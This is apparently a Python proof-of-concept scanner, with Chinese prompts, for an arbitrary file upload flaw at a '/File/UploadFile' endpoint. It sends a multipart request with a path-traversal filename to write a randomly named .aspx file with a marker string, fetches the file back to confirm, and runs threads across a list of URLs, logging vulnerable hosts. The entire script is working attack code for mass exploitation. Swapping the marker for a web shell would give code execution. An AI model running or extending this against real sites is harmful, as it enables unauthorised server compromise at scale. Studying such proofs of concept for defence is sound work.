import requests
import re
from threading import Thread
import warnings
import random
from multiprocessing import Pool
def main():
    warnings.filterwarnings('ignore')  # 忽略SSL警告
    print ("单url检测请按1，多url检测请按其他任意值:")
    choose=input()
    if choose=='1':
        print ("input:")
        url=input()
        bp(url)
    else:
        # 读取txt文件
        with open("./url.txt", "r") as f:
            # pool = Pool(60)
            for url in f.readlines():
                url = url.strip('\n')
                # print(url)
            #     pool.apply_async(bp,(url,))
            # pool.close()
            # pool.join()
                t = Thread(target=bp, args=(url,))
                t.start()
def bp(url):
    try:
        if 'http' not in url:
            url='http://'+url
        #print(r.text)
        flag=wirtefile(url)
        if flag==1:
            print('[+]   '+url+'存在漏洞')
            f = open("./success.txt", 'a')
            f.write(url+'\n')
            f.close()
        # if r2.status_code==200:
        #     print('[666]   '+url2+'存在配置文件')
        #     fff = open("./configsuccess.txt", 'a')
        #     fff.write(url2 + '\n')
        #     fff.close()
        else:
            print('[-]   '+url+'不存在漏洞')
    except:
        print('[!]   '+url+'连接失败')
def wirtefile(urls):
    # try:
        filename=''
        zf='1234567890qwertyuiopasdfghjklzxcvbnm'
        for _ in range(8):
            suiji1=random.randint(0,len(zf)-1)
            filename+=zf[suiji1]
        if urls[-1]=='/':
            url = urls + "File/UploadFile"
        else:
            url = urls + "/File/UploadFile"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=---------------------------21909179191068471382830692394',
            'Connection': 'close',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        body=f'''
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="file"; filename="../../../{filename}.aspx"\r
Content-Type: image/jpeg\r
\r
cnvdtest\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="action"\r
\r
unloadfile\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="filepath"\r
\r
./\r
-----------------------------21909179191068471382830692394\r
'''
        requests.post(url=url,data=body,headers=headers)
        # print(urls+'/'+filename+'.aspx')
        r=requests.get(urls+'/'+filename+'.aspx')
        # print(r.text)
        if 'cnvdtest' in r.text :
            flag=1
            return flag 
        else :
            flag=0
            return flag
    # except:
    #     flag=0
    #     return flag
if __name__ == '__main__':
    main()